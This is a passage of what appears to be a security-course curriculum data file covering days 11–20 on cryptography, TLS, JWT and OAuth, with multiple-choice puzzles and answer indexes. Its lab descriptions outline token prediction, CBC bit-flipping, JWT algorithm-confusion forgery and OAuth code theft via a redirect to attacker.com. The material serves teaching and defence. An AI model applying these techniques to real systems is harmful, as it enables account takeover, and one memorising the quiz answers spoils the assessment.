  // ─── BLOCK 3: Cryptography Foundations & Key Derivation (Days 11–15) ───────────────
  {
    day: 11,
    month: 1,
    blockNum: 3,
    title: "Cryptographic Randomness (CSPRNG): Entropy Pools, /dev/urandom vs Math.random()",
    stageName: "Stage 2: Defensive Fluency",
    stageNum: 2,
    pedagogicalRole: "Balanced Friction (Entropy & Predictable Randomness)",
    spokenGoal: "Uncover the hardware and mathematical distinction between pseudo-random number generators (PRNG) like Math.random() and Cryptographically Secure PRNGs (CSPRNG): inspect OS entropy pools, hardware RNG instructions (RDRAND), and why predictable seeds destroy security.",
    conceptInvariant: "Cryptographic Unpredictability Invariant: A PRNG (`Math.random()`, `rand()`) is designed strictly for statistical distribution, not forward/backward secrecy. An attacker observing a sequence of outputs from a linear congruential or Mersenne Twister generator can reconstruct the internal state and predict all future session tokens, reset links, and nonces. Cryptographic tokens must strictly use OS CSPRNG (`/dev/urandom`, `getrandom()`).",
    failureMode: "Using `Math.random().toString(36)` to generate password reset tokens, allowing an attacker to predict the exact reset token for the CEO's account after observing 5 password reset tokens on their own test accounts.",
    tryItFriction: "Write a security audit script that tests token generation entropy, identifies Linear Congruential Generator cycle patterns, and swaps insecure RNG calls with `crypto.randomBytes()`.",
    socraticHints: [
      "Why is `Math.random()` completely broken for security tokens?",
      "Because its internal seed state can be mathematically deduced from just a few observed outputs!",
      "Use `crypto.randomBytes(32)` or `crypto.getRandomValues()` to draw true unpredictable entropy from the OS kernel."
    ],
    situationalPuzzle: {
      scenario: "A startup uses `const token = crypto.createHash('sha256').update(Date.now() + userId).digest('hex')` to issue API access keys. An external researcher requests their own key and immediately predicts the access key generated for another user 20 milliseconds earlier. Why is this hash predictable?",
      options: [
        "SHA-256 has been cryptographically cracked.",
        "Low-Entropy Input Trap: Hashing deterministic data (timestamp + user ID) provides zero entropy. The attacker only needs to brute-force a few thousand millisecond timestamp candidates to match the target user's hash.",
        "The server time was synchronized using NTP.",
        "API keys must be 1024 bits long."
      ],
      answerIdx: 1,
      debrief: "A cryptographic hash function is deterministic: hashing predictable inputs produces predictable outputs. Secure tokens require high-entropy randomness generated directly by a CSPRNG, not hashes of timestamps."
    },
    quests: [
      { id: "sec-m1-d11-q1", name: "OS Kernel Entropy Pools & CSPRNG Subsystems", type: "concept", desc: "Contrast Linux /dev/urandom and getrandom(2) with Mersenne Twister and PRNG state reconstruction." },
      { id: "sec-m1-d11-q2", name: "Detective Lab: Predicting PRNG Password Reset Tokens", type: "detective", desc: "Write a script that observes 10 outputs from an insecure PRNG and calculates the next 5 issued password reset codes." },
      { id: "sec-m1-d11-q3", name: "Mastery Assignment: Cryptographically Secure Token & Nonce Generator", type: "assignment", desc: "Build a TypeScript module generating high-entropy base64url UUIDs, API tokens, and nonces using OS CSPRNG." },
      { id: "sec-m1-d11-q4", name: "Production Incident Lab: Account Takeover via Predictable Session Identifiers", type: "detective", desc: "Triage an incident where an adversary hijacked customer accounts by predicting session cookie sequences." }
    ]
  },
  {
    day: 12,
    month: 1,
    blockNum: 3,
    title: "Symmetric Encryption: AES-GCM Authenticated Encryption (AEAD) vs AES-CBC Insecurities",
    stageName: "Stage 2: Defensive Fluency",
    stageNum: 2,
    pedagogicalRole: "Balanced Friction (Block Ciphers & Authenticated Encryption)",
    spokenGoal: "Engineer symmetric encryption correctly: analyze the fatal pitfalls of legacy AES-CBC (Padding Oracle attacks, Bit-Flipping), and master modern Authenticated Encryption with Associated Data (AEAD) using AES-256-GCM with 96-bit unique nonces and 128-bit authentication tags.",
    conceptInvariant: "Nonce Uniqueness & Integrity Invariant: In Galois/Counter Mode (AES-GCM), a nonce (Initialization Vector / IV) must NEVER be reused with the same cryptographic key. Reusing a nonce destroys confidentiality and allows attackers to recover the authentication hash key. Furthermore, ciphertext must never be decrypted or accepted without verifying the 128-bit authentication tag.",
    failureMode: "Encrypting credit card numbers using AES-256-CBC without HMAC authentication, allowing an attacker to flip bits in the ciphertext block to alter the transaction amount or execute a padding oracle attack to decrypt the card number in seconds.",
    tryItFriction: "Implement an AES-256-GCM encryption and decryption module in Node.js/TypeScript that generates a fresh 96-bit IV per message, binds associated data (user ID), and rejects tampered ciphertexts with an authentication error.",
    socraticHints: [
      "Why is encryption alone insufficient without authentication?",
      "Because an attacker can modify the encrypted bits, and without an auth tag, the decrypted result will be accepted as valid by the backend!",
      "Use AES-GCM: it simultaneously encrypts the plaintext and produces a 16-byte authentication tag that proves the ciphertext was not modified."
    ],
    situationalPuzzle: {
      scenario: "A developer builds an encrypted database field service using AES-256-GCM. To optimize storage, they use a static hardcoded IV (`Buffer.alloc(12, 0)`) for all rows. A security auditor flags this as an immediate critical vulnerability. What mathematical disaster occurs when an AES-GCM IV is reused?",
      options: [
        "The CPU AES-NI instructions will overheat.",
        "GCM Nonce Reuse Catastrophe: Encrypting two different plaintexts with the same key and IV produces ciphertexts whose XOR reveals the XOR of the plaintexts ($C_1 \\oplus C_2 = P_1 \\oplus P_2$), and enables the attacker to mathematically solve for the GMAC authentication key ($H$), forging arbitrary valid ciphertexts.",
        "The encrypted data cannot be indexed in MySQL.",
        "AES-GCM only supports 128-bit keys."
      ],
      answerIdx: 1,
      debrief: "Reusing an IV in AES-GCM breaks the fundamental mathematical security proof of both confidentiality (via keystream reuse) and integrity (via GMAC polynomial roots), allowing total ciphertext forgery."
    },
    quests: [
      { id: "sec-m1-d12-q1", name: "Block Cipher Modes: CBC vs CTR vs GCM AEAD Architecture", type: "concept", desc: "Deconstruct Galois field arithmetic, GHASH tag computation, and why AEAD eliminates padding oracle vulnerabilities." },
      { id: "sec-m1-d12-q2", name: "Detective Lab: Exploiting CBC Bit-Flipping Attacks on Encrypted Cookies", type: "detective", desc: "Alter an encrypted session cookie in CBC mode to change `user_role=guest` into `user_role=admin` without knowing the key." },
      { id: "sec-m1-d12-q3", name: "Mastery Assignment: AES-256-GCM Authenticated Encryption Envelope Module", type: "assignment", desc: "Build a TypeScript encryption utility generating 96-bit CSPRNG IVs, validating 128-bit tags, and binding AAD headers." },
      { id: "sec-m1-d12-q4", name: "Production Incident Lab: Database Field Decryption Crash on Tampered Auth Tag", type: "detective", desc: "Triage a production service failure where an unauthenticated direct database modification corrupted an AES-GCM auth tag." }
    ]
  },
  {
    day: 13,
    month: 1,
    blockNum: 3,
    title: "Asymmetric Cryptography: RSA-OAEP, Elliptic Curves (ECC, Ed25519) & Key Negotiation",
    stageName: "Stage 2: Defensive Fluency",
    stageNum: 2,
    pedagogicalRole: "Balanced Friction (Public-Key Cryptography & Discrete Logarithms)",
    spokenGoal: "Grasp public-key cryptography: compare the integer factorization problem in RSA (2048/4096-bit) against the discrete logarithm problem over elliptic curve groups (NIST P-256, Ed25519, Curve25519), and master asymmetric signatures and key exchange protocols.",
    conceptInvariant: "Security-to-Key-Length Ratio Invariant: A 256-bit elliptic curve key (Ed25519) provides 128 bits of cryptographic security equivalent to a 3072-bit RSA key, while consuming 90% less bandwidth and CPU computation. RSA encryption must always use Optimal Asymmetric Encryption Padding (OAEP), never deprecated PKCS#1 v1.5.",
    failureMode: "Using raw 'textbook' RSA without padding or with legacy PKCS#1 v1.5 padding, allowing an attacker to execute Bleichenbacher's Million Message Attack (chosen-ciphertext attack) to decrypt private keys or messages.",
    tryItFriction: "Generate Ed25519 asymmetric key pairs in TypeScript, sign an API payload, and verify the cryptographic signature while rejecting any payload byte mutations.",
    socraticHints: [
      "Why can't you just encrypt data by computing $C = M^e \\pmod N$ without padding?",
      "Because small messages or identical plaintexts will always produce identical ciphertexts, allowing dictionary matching and mathematical attacks!",
      "Use RSA-OAEP with SHA-256 padding for encryption, or prefer modern Ed25519 / ECDSA for digital signatures."
    ],
    situationalPuzzle: {
      scenario: "A microservice cluster generates digital signatures for webhook events using ECDSA with NIST P-256. The developer generates the signature random nonce $k$ using `Math.random()`. After 10 webhooks are signed, an attacker extracts the microservice's private signing key. How did this happen?",
      options: [
        "NIST P-256 has an intentional NSA backdoor.",
        "ECDSA Nonce Reuse / Bias Trap: In ECDSA, if the random nonce $k$ is reused even once, or is statistically biased/predictable, the private key $d$ can be directly solved via simple linear modular arithmetic ($d = (s_1 k - z_1) / r$).",
        "Webhooks do not support asymmetric cryptography.",
        "The signature was sent over an unencrypted channel."
      ],
      answerIdx: 1,
      debrief: "ECDSA requires that the per-signature nonce $k$ is cryptographically random and unique. Sony's PS3 was famously hacked because of this exact flaw. Modern systems prefer Ed25519 (RFC 8032) which derives $k$ deterministically from the private key and message, eliminating nonce reuse vulnerabilities entirely."
    },
    quests: [
      { id: "sec-m1-d13-q1", name: "RSA Factorization vs Elliptic Curve Discrete Logarithms", type: "concept", desc: "Compare mathematical hardness assumptions between prime factorization ($N=pq$) and elliptic curve point multiplication ($Q=dG$)." },
      { id: "sec-m1-d13-q2", name: "Detective Lab: Recovering Private Key from Biased ECDSA Nonces", type: "detective", desc: "Analyze ECDSA signatures generated with predictable nonces and mathematically calculate the hidden private signing key." },
      { id: "sec-m1-d13-q3", name: "Mastery Assignment: Ed25519 Cryptographic Webhook Signing & Verification Service", type: "assignment", desc: "Build a TypeScript signing gateway using Ed25519 that signs outbound webhook payloads and verifies inbound signatures." },
      { id: "sec-m1-d13-q4", name: "Production Incident Lab: Compromised Microservice Signing Key Post-Mortem", type: "detective", desc: "Investigate an incident where an adversary forged inter-service authentication tokens using a compromised signing key." }
    ]
  },
  {
    day: 14,
    month: 1,
    blockNum: 3,
    title: "Secure Password Hashing: Argon2id (Memory-Hardness, Time/Lanes) vs Bcrypt vs PBKDF2",
    stageName: "Stage 2: Defensive Fluency",
    stageNum: 2,
    pedagogicalRole: "Balanced Friction (Slow Hashes & Hardware ASIC Resistance)",
    spokenGoal: "Protect user credentials against GPU/ASIC brute-force cracking: understand why fast general-purpose hashes (MD5, SHA-256) are disastrous for passwords, compare PBKDF2 and Bcrypt against modern winner Argon2id, and tune memory, time, and parallelism parameters.",
    conceptInvariant: "Memory-Hardness Invariant: Fast cryptographic hashes (SHA-256) can be evaluated at billions of hashes per second on consumer GPUs. Password hashing functions must be intentionally slow and memory-hard. Argon2id fills a multi-megabyte memory matrix (e.g. 64 MB) during computation, creating a memory-bandwidth bottleneck that neutralizes parallel GPU/ASIC attack farms.",
    failureMode: "Hashing passwords with `crypto.createHash('sha256').update(password + salt).digest()`, allowing an attacker with a modest GPU cluster to crack an 8-character password hash in under 5 minutes.",
    tryItFriction: "Benchmark Argon2id parameter tuning in TypeScript: measure hash latency across varying memory costs (16MB vs 64MB) and iterations to achieve a target 300ms verification budget while resisting GPU attacks.",
    socraticHints: [
      "Why did Argon2id win the Password Hashing Competition over Bcrypt and PBKDF2?",
      "Because Bcrypt only uses 4KB of memory and PBKDF2 uses almost none, making them vulnerable to modern FPGA/ASIC hardware!",
      "Argon2id combines memory-hardness (Argon2d) to defeat GPUs with data-independent memory access (Argon2i) to defeat side-channel cache attacks."
    ],
    situationalPuzzle: {
      scenario: "A legacy system hashes passwords with MD5. The team wants to upgrade to Argon2id without forcing all 1,000,000 users to reset their passwords. How should this upgrade be architected in production?",
      options: [
        "Decrypt the MD5 hashes back into plain text and then hash them with Argon2id.",
        "Transparent Re-hash on Login Pattern: Upon user login, verify the plaintext password against the legacy MD5 hash. If valid, immediately compute the new Argon2id hash and update the database column, upgrading users transparently over time.",
        "Keep MD5 because adding a longer salt makes MD5 quantum-proof.",
        "Force users to enter their passwords via an unauthenticated API endpoint."
      ],
      answerIdx: 1,
      debrief: "Cryptographic hashes are one-way and cannot be decrypted. The standard production pattern for migrating legacy password hashes is re-hashing upon successful user authentication or wrapping the legacy hash inside the new hash: `Argon2id(MD5(password))`."
    },
    quests: [
      { id: "sec-m1-d14-q1", name: "Password Hash Complexity: Work Factors & GPU Hash Rates", type: "concept", desc: "Compare hash throughput of SHA-256 (Giga-hashes/sec) vs Bcrypt (Kilo-hashes/sec) vs Argon2id (Single-digit/sec)." },
      { id: "sec-m1-d14-q2", name: "Detective Lab: Profiling Timing Attacks on Password Verification", type: "detective", desc: "Profile naive string comparison `===` on hash digests and implement `crypto.timingSafeEqual()` to eliminate timing leaks." },
      { id: "sec-m1-d14-q3", name: "Mastery Assignment: Production Argon2id Credential Vault with Re-hash Middleware", type: "assignment", desc: "Build a TypeScript credential verification engine with Argon2id parameter calibration and automated re-hash detection." },
      { id: "sec-m1-d14-q4", name: "Production Incident Lab: Leaked Database Dump Cracking Resistance Triage", type: "detective", desc: "Assess enterprise blast radius after an archived database dump containing hashed credentials was exposed online." }
    ]
  },
  {
    day: 15,
    month: 1,
    blockNum: 3,
    title: "⭐ MILESTONE 3: Cryptographic Vault: AES-256-GCM Envelope Encryption Engine with Argon2id",
    stageName: "Stage 2: Defensive Fluency",
    stageNum: 2,
    pedagogicalRole: "Balanced Friction (Milestone Gate: Cryptographic Envelope & Key Derivation)",
    spokenGoal: "Assemble Milestone 3: Construct an enterprise Cryptographic Vault implementing Envelope Encryption (KMS model): derive root Key Encryption Keys (KEK) via Argon2id, generate ephemeral Data Encryption Keys (DEK), and encrypt sensitive payloads using AES-256-GCM AEAD.",
    conceptInvariant: "Envelope Encryption Invariant: Never use the root master key to directly encrypt bulk data. Use the root Key Encryption Key (KEK) to encrypt an ephemeral Data Encryption Key (DEK). The ciphertext is stored alongside the encrypted DEK. This limits the blast radius of key exposure and enables high-performance key rotation without re-encrypting terabytes of bulk data.",
    failureMode: "Encrypting millions of customer records directly with a single static AES key in memory: if the key leaks or needs rotation, every single database row must be decrypted and re-encrypted simultaneously, causing a massive database outage.",
    tryItFriction: "Complete Milestone 3 by writing a full Envelope Encryption engine in TypeScript that generates ephemeral DEKs, encrypts payloads with AES-256-GCM, wraps DEKs with an Argon2id-derived KEK, and verifies integrity tags.",
    socraticHints: [
      "How does envelope encryption enable seamless key rotation?",
      "To rotate the master key, you only re-encrypt the small encrypted DEKs, not the underlying multi-gigabyte data files!",
      "Store `{ encryptedData, encryptedDEK, iv, tag }` so the engine decrypts the DEK with the KEK, then decrypts data with the DEK."
    ],
    situationalPuzzle: {
      scenario: "An enterprise stores encrypted payment records in Postgres using Envelope Encryption. A developer logs `console.log(vault.decrypt(record))` during debugging. The decrypted credit card numbers appear in Datadog/CloudWatch logs. What architectural principle was violated?",
      options: [
        "Postgres cannot store encrypted buffers.",
        "Zero-Leak Logging & Zeroization Violation: Cryptographic plaintext and sensitive key material must never touch application logging pipelines. Furthermore, decrypted buffers in memory must be overwritten with zeros (`buf.fill(0)`) immediately after use.",
        "CloudWatch only accepts base64-encoded strings.",
        "Credit cards can only be encrypted with RSA."
      ],
      answerIdx: 1,
      debrief: "Securing data at rest is pointless if plaintext is leaked into telemetry or log aggregators. Production vaults enforce strict PII redaction log masks and memory zeroization to destroy decrypted buffers as soon as execution completes."
    },
    quests: [
      { id: "sec-m1-d15-q1", name: "Milestone 3 Architecture: KMS Envelope Encryption Protocol", type: "concept", desc: "Design the envelope hierarchy separating Key Encryption Keys (KEK), Data Encryption Keys (DEK), and ciphertexts." },
      { id: "sec-m1-d15-q2", name: "Detective Lab: Auditing Memory Leaks of Decrypted Cryptographic Buffers", type: "detective", desc: "Inspect heap memory dumps after cryptographic decryption and verify that sensitive key bytes are wiped via zeroization." },
      { id: "sec-m1-d15-q3", name: "Mastery Assignment: Full Enterprise Cryptographic Vault Engine", type: "assignment", desc: "Build a TypeScript envelope encryption vault with Argon2id KEK derivation, ephemeral AES-GCM DEK generation, and key rotation." },
      { id: "sec-m1-d15-q4", name: "Production Incident Lab: Master Key Rotation War Room under Active Breach Notice", type: "detective", desc: "Execute an emergency KEK key rotation on 100,000 encrypted financial records without incurring database downtime." }
    ]
  },

  // ─── BLOCK 4: Identity, Tokens & Authentication Protocols (Days 16–20) ──────────
  {
    day: 16,
    month: 1,
    blockNum: 4,
    title: "Public Key Infrastructure (PKI): X.509 Certificate Chains, CRL, OCSP & Certificate Transparency",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Trust Chains & Certificate Revocation)",
    spokenGoal: "Deconstruct the trust infrastructure of the Internet: analyze X.509 digital certificates, hierarchical chains of trust from Root CA to Intermediate to Leaf, certificate revocation mechanisms (CRL vs OCSP Stapling), and Google's Certificate Transparency (CT) append-only logs.",
    conceptInvariant: "Chain of Trust Invariant: A certificate is valid if and only if: (1) its current timestamp falls between NotBefore and NotAfter, (2) its Subject Alternative Name (SAN) matches the connecting hostname, (3) its digital signature is cryptographically verified by an Issuer whose certificate chains to a locally trusted Root CA in the OS trust store, and (4) it is not revoked via OCSP/CRL.",
    failureMode: "Disabling certificate verification in backend HTTP clients (`rejectUnauthorized: false` or `InsecureSkipVerify: true`) to bypass a staging environment SSL error, allowing any attacker on the local network to execute a Man-in-the-Middle (MitM) attack in production.",
    tryItFriction: "Build a certificate verification utility in TypeScript that parses an X.509 certificate PEM, validates dates, matches SAN DNS patterns, and verifies the cryptographic signature against an intermediate CA.",
    socraticHints: [
      "Why is `rejectUnauthorized: false` a fatal vulnerability in production?",
      "Because it tells the TLS client to accept ANY certificate presented by an attacker, completely disabling encryption authentication!",
      "Install the custom private CA certificate into the system trust store instead of disabling certificate validation."
    ],
    situationalPuzzle: {
      scenario: "A mobile banking app connects to `api.bank.com`. An attacker on a public Wi-Fi network uses a rogue Root CA installed on the victim's device (via corporate MDM or malware) to intercept and decrypt the banking traffic. What cryptographic defense completely prevents this attack?",
      options: [
        "Increasing the AES key size to 512 bits.",
        "SSL/TLS Certificate Pinning: The mobile app hardcodes (pins) the public key hash (SPKI) or certificate of the bank's legitimate server. Even if a rogue Root CA is trusted by the operating system, the app refuses connections whose public key does not match the pinned hash.",
        "Using HTTP instead of HTTPS.",
        "Changing the server domain name to an IP address."
      ],
      answerIdx: 1,
      debrief: "Certificate Pinning ensures the client only trusts a specific cryptographic public key rather than the hundreds of Certificate Authorities trusted by the OS. It defeats rogue CAs, compromised corporate proxies, and rogue MDM intercepts."
    },
    quests: [
      { id: "sec-m1-d16-q1", name: "X.509 Structure, ASN.1 Encoding & Trust Hierarchies", type: "concept", desc: "Examine ASN.1 DER encoding, Basic Constraints (CA:TRUE/FALSE), Key Usage, and SAN extensions in X.509 certificates." },
      { id: "sec-m1-d16-q2", name: "Detective Lab: Inspecting Certificate Transparency Logs for Rogue Issuances", type: "detective", desc: "Query public Certificate Transparency (CT) logs using crt.sh to identify unauthorized certificate issuances for a corporate domain." },
      { id: "sec-m1-d16-q3", name: "Mastery Assignment: X.509 Chain Validator & SPKI Public Key Pinning Engine", type: "assignment", desc: "Build a TypeScript TLS client that verifies complete X.509 certificate chains and enforces SHA-256 SPKI public key pinning." },
      { id: "sec-m1-d16-q4", name: "Production Incident Lab: Outage Triage after Expired Intermediate CA Certificate", type: "detective", desc: "Resolve a critical production outage where thousands of API calls failed simultaneously due to an expired intermediate CA in the bundle." }
    ]
  },
  {
    day: 17,
    month: 1,
    blockNum: 4,
    title: "TLS 1.3 Protocol Mechanics: 1-RTT Handshake, Ephemeral Diffie-Hellman & Forward Secrecy",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Transport Layer Security Protocol State)",
    spokenGoal: "Analyze the security evolution from TLS 1.2 to TLS 1.3: understand how TLS 1.3 dropped legacy weak ciphers (RC4, DES, CBC, static RSA key exchange), reduced handshake latency to 1-RTT (and 0-RTT resumption), and guarantees Perfect Forward Secrecy (PFS) via Ephemeral Diffie-Hellman (ECDHE).",
    conceptInvariant: "Perfect Forward Secrecy (PFS) Invariant: Compromising a server's long-term private key must not allow an attacker to retroactively decrypt past recorded network sessions. In TLS 1.3, session keys are derived from ephemeral Diffie-Hellman key pairs ($g^{ab} \\pmod p$) discarded immediately after the connection terminates.",
    failureMode: "Using static RSA key exchange where the client encrypts the pre-master secret using the server's public key: an adversary recording encrypted traffic today can decrypt every historical session years later if they ever obtain the server's private key.",
    tryItFriction: "Analyze a Wireshark / TLS 1.3 packet capture trace: identify ClientHello, ServerHello, EncryptedExtensions, and master secret derivation phases, and verify that cipher suites are restricted to modern AEAD algorithms.",
    socraticHints: [
      "Why did TLS 1.3 completely ban static RSA key exchange?",
      "Because static RSA does not provide forward secrecy: if the server's private key leaks, ALL past recorded traffic is compromised!",
      "TLS 1.3 mandates Ephemeral Diffie-Hellman (ECDHE) so session keys are generated dynamically and discarded immediately."
    ],
    situationalPuzzle: {
      scenario: "An engineering team enables TLS 1.3 0-RTT (Early Data) to achieve ultra-fast connection resumption on their REST API. A security reviewer flags that state-changing endpoints (e.g. `POST /api/pay`) are now vulnerable to replay attacks. Why does 0-RTT introduce replay risks?",
      options: [
        "0-RTT uses unencrypted plaintext.",
        "0-RTT Anti-Replay Vulnerability: The early data in 0-RTT is sent before the server completes the handshake verification. A network eavesdropper can capture the initial 0-RTT packet and replay it to the server multiple times, causing duplicate financial transactions unless idempotent anti-replay tokens are enforced.",
        "TLS 1.3 does not support POST requests.",
        "0-RTT only works on Safari browsers."
      ],
      answerIdx: 1,
      debrief: "0-RTT early data does not have forward secrecy or replay protection against network eavesdroppers. RFC 8446 strictly states that 0-RTT should only be used for idempotent GET requests, never for non-idempotent state mutations like payments."
    },
    quests: [
      { id: "sec-m1-d17-q1", name: "TLS 1.3 vs TLS 1.2 Handshake State Transitions", type: "concept", desc: "Trace the 1-RTT handshake, key schedule derivation (HKDF), and why renegotiation was completely removed." },
      { id: "sec-m1-d17-q2", name: "Detective Lab: Dissecting 0-RTT Replay Vulnerabilities", type: "detective", desc: "Simulate a network replay attack on a TLS 1.3 early data stream and demonstrate duplicate execution on non-idempotent endpoints." },
      { id: "sec-m1-d17-q3", name: "Mastery Assignment: Hardened TLS Configuration & Cipher Suite Validator", type: "assignment", desc: "Build a TypeScript scanner that inspects server TLS configurations and verifies TLS 1.3, HSTS, and PFS cipher suites." },
      { id: "sec-m1-d17-q4", name: "Production Incident Lab: Downgrade Attack Triage on Enterprise Payment Gateway", type: "detective", desc: "Investigate an attempted TLS downgrade attack where a malicious middlebox attempted to force clients onto TLS 1.0." }
    ]
  },
  {
    day: 18,
    month: 1,
    blockNum: 4,
    title: "JSON Web Tokens (JWT): Alg 'none' Attacks, RSA/HMAC Confusion, JWKS & Revocation Lists",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Stateless Tokens & Verification Flaws)",
    spokenGoal: "Dissect JSON Web Token (JWT / RFC 7519) security: eliminate critical vulnerabilities including the notorious `alg: none` exploit, asymmetric-to-symmetric key confusion (RSA public key used as HMAC secret), JWKS spoofing, and architect scalable token revocation lists in Redis.",
    conceptInvariant: "Cryptographic Algorithm Hardening Invariant: A JWT verification engine must never allow the token's unverified header (`alg`) to dictate which cryptographic algorithm or key type is used for verification. The backend must enforce an explicit expected algorithm (e.g., strictly `RS256` or strictly `ES256`) and reject any tokens signed with unexpected algorithms.",
    failureMode: "Relying on `jwt.verify(token, secretOrPublicKey)` where the algorithm is read dynamically from the token header: an attacker changes `alg` from `RS256` to `HS256` and signs the token using the server's public RSA key (which is publicly known), successfully forging an admin token.",
    tryItFriction: "Write a secure JWT verification handler in TypeScript that explicitly restricts allowed algorithms to `['RS256']`, validates `iss`, `aud`, and `exp` claims, and checks active revocation IDs (jti) against a Redis bloom filter.",
    socraticHints: [
      "What happens if an attacker sends `{\"alg\": \"none\"}` in the JWT header?",
      "A vulnerable library skips signature verification and accepts the forged payload as valid!",
      "Always pass `{ algorithms: ['RS256'] }` so the verifier refuses any token that specifies `none` or `HS256`."
    ],
    situationalPuzzle: {
      scenario: "A microservice cluster validates user JWTs statelessly without querying a central database. A user's account is compromised, and an admin clicks 'Revoke All Sessions'. However, the attacker continues making authenticated requests for the next 4 hours using their existing JWT. What fundamental stateless architecture flaw occurred?",
      options: [
        "The JWT expired earlier than expected.",
        "Stateless Token Revocation Blindspot: Pure stateless JWTs cannot be revoked before their expiration (`exp`) timestamp without maintaining a revocation blacklist or token version counter in a distributed cache (like Redis).",
        "The server failed to re-encrypt the JWT.",
        "JWT signatures are only valid for 60 seconds."
      ],
      answerIdx: 1,
      debrief: "Statelessness is a double-edged sword: once issued, a JWT is valid until it expires. Secure systems use short-lived access tokens (5–15 minutes) combined with revocable refresh tokens, or maintain a distributed revocation list (checking `jti` in Redis) for high-privilege operations."
    },
    quests: [
      { id: "sec-m1-d18-q1", name: "JWT JWS Structure, JOSE Headers & Signature Verification", type: "concept", desc: "Deconstruct Base64URL header, payload, and signature segments, and map RFC 7515/7519 verification steps." },
      { id: "sec-m1-d18-q2", name: "Detective Lab: Executing the RS256 to HS256 Key Confusion Exploit", type: "detective", desc: "Construct a forged JWT payload exploiting an algorithm confusion flaw using an extracted PEM public key as an HMAC secret." },
      { id: "sec-m1-d18-q3", name: "Mastery Assignment: Hardened JWT Verifier with Remote JWKS & Redis Revocation", type: "assignment", desc: "Implement a TypeScript JWT verification gateway with strict algorithm pinning, JWKS rate limiting, and jti revocation checking." },
      { id: "sec-m1-d18-q4", name: "Production Incident Lab: Compromised Admin Account Token Forgery Triage", type: "detective", desc: "Investigate an incident where an adversary bypassed authentication using a modified token header during an API migration." }
    ]
  },
  {
    day: 19,
    month: 1,
    blockNum: 4,
    title: "OAuth 2.1 & OpenID Connect: PKCE (RFC 7636), State Parameters & Redirect URI Hijacking",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Federated Identity & Delegation Protocols)",
    spokenGoal: "Master modern delegated authorization with OAuth 2.1 and OpenID Connect (OIDC): eliminate the dangerous Implicit Grant flow, implement Proof Key for Code Exchange (PKCE) for all clients, enforce exact redirect URI matching, and defend against Authorization Code interception.",
    conceptInvariant: "Proof Key for Code Exchange (PKCE) Invariant: The authorization code flow must bind the authorization request to the token redemption request using a cryptographically random code verifier ($V$) and code challenge ($C = \\text{BASE64URL}(\\text{SHA256}(V))$). An intercepted authorization code is useless to an attacker because they cannot produce the secret $V$ stored only on the client.",
    failureMode: "Using wildcard redirect URIs (`https://app.com/*`), allowing an attacker to construct an authorization link pointing to `https://app.com/logout?redirect=attacker.com`, stealing the authorization code via the Referer header or open redirect.",
    tryItFriction: "Implement a complete OAuth 2.1 Authorization Code flow with PKCE in TypeScript: generate the code verifier and challenge, validate the state parameter against CSRF, and exchange the code for an ID token.",
    socraticHints: [
      "Why was the OAuth 2.0 Implicit Flow deprecated in OAuth 2.1?",
      "Because returning access tokens directly in the URL hash fragment exposes them to browser history, logs, and XSS attacks!",
      "Use Authorization Code Flow with PKCE: tokens are returned strictly in a direct POST response between client and server."
    ],
    situationalPuzzle: {
      scenario: "A developer implements an OAuth 2.0 login integration with Google. They omit the `state` parameter because 'Google is already a trusted provider'. A security researcher demonstrates an attack where a victim is tricked into clicking a link and ends up logged into the attacker's Google account. What attack was demonstrated?",
      options: [
        "DNS spoofing attack.",
        "OAuth Login CSRF Attack: Without a cryptographically random `state` parameter bound to the victim's session, the attacker traps the victim into redeeming an authorization code belonging to the attacker's account, linking the victim's local activity to the attacker's identity.",
        "Google OAuth was down.",
        "The browser cookies were cleared."
      ],
      answerIdx: 1,
      debrief: "The `state` parameter prevents Login CSRF. It binds the authorization request initiated in the user's browser with the callback response, ensuring the user is redeeming their own authorization code, not a code injected by an attacker."
    },
    quests: [
      { id: "sec-m1-d19-q1", name: "OAuth 2.1 & OIDC Grant Types, Scopes & Identity Claims", type: "concept", desc: "Map Authorization Code Flow + PKCE, ID Token validation (sub, iss, aud), and UserInfo endpoint federation." },
      { id: "sec-m1-d19-q2", name: "Detective Lab: Exploiting Open Redirects for OAuth Code Theft", type: "detective", desc: "Audit an OAuth client with loose redirect URI regex matching and demonstrate code extraction via open redirect." },
      { id: "sec-m1-d19-q3", name: "Mastery Assignment: Full OAuth 2.1 / OIDC Client with PKCE & State Validation", type: "assignment", desc: "Build a TypeScript OIDC client with SHA-256 PKCE generation, state verification, and RS256 ID Token signature checks." },
      { id: "sec-m1-d19-q4", name: "Production Incident Lab: Account Takeover via Compromised Redirect URI Post-Mortem", type: "detective", desc: "Triage a security incident where an adversary hijacked customer accounts through an unvalidated OAuth callback endpoint." }
    ]
  },
  {
    day: 20,
    month: 1,
    blockNum: 4,
    title: "⭐ MILESTONE 4: Enterprise Identity Provider & Token Verification Gateway (OAuth 2.1 / OIDC + PKCE)",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Milestone Gate: Identity & Access Management)",
    spokenGoal: "Assemble Milestone 4: Construct an enterprise-grade Identity Provider & Token Verification Gateway implementing OAuth 2.1, OIDC token issuance, RS256/ES256 asymmetric signatures, JWKS endpoints, and strict PKCE enforcement.",
    conceptInvariant: "Federated Identity Invariant: An identity token proves WHO the user is (authentication); an access token grants WHAT the user can do (authorization). The gateway must independently verify both using cryptographic signatures, audience validation, and scope verification without trusting raw client claims.",
    failureMode: "Accepting an ID token as proof of authorization to invoke a sensitive administrative API without checking the token's audience (`aud`) claim, allowing a token issued for a third-party mobile app to invoke internal administrative APIs.",
    tryItFriction: "Complete Milestone 4 by creating a production token verification gateway that rotates RSA key pairs, serves `/.well-known/jwks.json`, validates PKCE challenge verifications, and enforces scope permissions.",
    socraticHints: [
      "Why must the `aud` (audience) claim always be verified?",
      "To prevent token substitution attacks where a valid token issued for App A is replayed against App B!",
      "Verify that `aud` strictly equals your service's client ID and `iss` strictly matches your trusted authorization server."
    ],
    situationalPuzzle: {
